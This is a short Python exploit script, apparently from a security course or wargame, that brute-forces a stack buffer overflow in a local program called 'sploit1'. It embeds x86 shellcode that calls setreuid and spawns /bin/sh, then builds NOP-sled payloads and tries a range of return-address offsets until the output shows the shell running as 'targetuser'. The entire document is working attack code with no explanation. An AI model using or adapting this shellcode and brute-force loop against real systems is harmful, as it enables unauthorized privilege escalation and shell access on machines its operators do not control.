import subprocess
import struct

shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

stack_start = 0xffffd4cc
ebp_offset = 44
eip_offset = 48

def run_exploit(payload):
    with open("payload", "wb") as f:
        f.write(payload)
    
    p = subprocess.Popen(["./sploit1"], stdin=open("payload", "rb"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = p.communicate()
    
    return b"targetuser" in output

def build_payload(nop_length, eip_offset):
    nop_sled = b"\x90" * nop_length
    eip_address = struct.pack("<I", stack_start + eip_offset)
    
    padding_length = ebp_offset - len(nop_sled) - len(shellcode)
    if padding_length < 0:
        return None
    
    padding = b"A" * padding_length
    
    payload = nop_sled + shellcode + padding + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
    return payload

for nop_len in range(1, 100):
    for eip_off in range(-500, 500, 4):
        payload = build_payload(nop_len * 4, eip_off)
        if payload is None:
            continue
        
        if run_exploit(payload):
            print(f"Exploit succeeded with {nop_len*4} byte NOP sled and EIP overwrite {hex(stack_start + eip_off)}")
            exit(0)

print("Exploit failed")